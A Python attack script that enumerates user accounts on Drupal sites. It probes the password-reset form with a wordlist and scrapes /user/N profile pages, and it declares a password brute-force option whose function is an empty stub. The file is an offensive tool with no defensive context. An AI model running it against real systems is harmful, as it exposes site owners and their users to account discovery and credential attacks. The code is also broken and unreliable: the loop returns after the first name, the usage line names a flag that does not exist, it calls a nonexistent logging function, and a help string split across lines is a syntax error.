#!/bin/python
# coding: utf-8

# to use it:
# python enum-users.py -u http://127.0.0.1 -w wordlist.txt --auto --verbose

import requests
from bs4 import BeautifulSoup
import sys
from optparse import OptionParser
import re
import logging


def wordlist(options):
    # url to target
    url = "%s/user/password" % options.url

    # load the usernames to enumerate
    with open(options.wordlist) as f:
        usernames = f.readlines()

    found = []

    for username in usernames:
        username = username.rstrip()
        logging.debug("Trying %s", username)
        # get form id
        req = requests.get(url)
        soup = BeautifulSoup(req.content)
        # get form
        form = soup.find('form', attrs={'id': 'user-pass'})
        form_build_id = form.find('input', attrs={'name': 'form_build_id'})['value']
        form_id = form.find('input', attrs={'name': 'form_id'})['value']
        op = form.find('input', attrs={'name': 'op'})['value']
        # send request
        data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username}
        req = requests.post(url, data=data)
        if ('is not recognized as a user name or an e-mail address.' in req.content):
            logging.debug("Username '%s' does not exist", username)
        else:
            print("[!] Username '%s' exists" % username)
            found.append(username)
        return found

def auto(options):
    # url to target
    url = "%s/user/" % options.url

    found = []
    for i in range(1, 1000):
        tmp_url = "%s%s" % (url, i)
        logging.debug("Trying '%s'", tmp_url)
        req = requests.get(tmp_url)

        username = re.search(r"/users/([a-zA-Z0-9-/.!?]+)", str(req.content))
        if username:
            print("[!] Username '%s' found" % username.group(1))
            found.append(username.group(1))
    return found


def brute(pwlist, usernamelist):
    pass


def main():
    parser = OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL of the Drupal install", default=None)
    parser.add_option("-n", "--namelist", dest="wordlist", help="list of usernames you want to try", default=None)
    parser.add_option("-p", "--pwlist", dest="pwlist", help="list of passwords you want to try with bruteforce on found
                      users", default=None)
    parser.add_option("-a", "--auto", action="store_true", dest="auto", help="Automatic method to enumerate users",
                      default=None)
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Verbose mode")

    options, _ = parser.parse_args()

    if options.verbose:
        logging.setloglevel(logging.DEBUG)

    if not options.url or (not options.wordlist and not options.auto):
        print(parser.print_help())
        sys.exit(-1)

    found = []
    if options.wordlist:
        found.append(wordlist(options))
    if options.auto:
        found.append(auto(options))
    if options.pwlist:
        brute(options.pwlist, found)


if __name__ == '__main__':
    main()
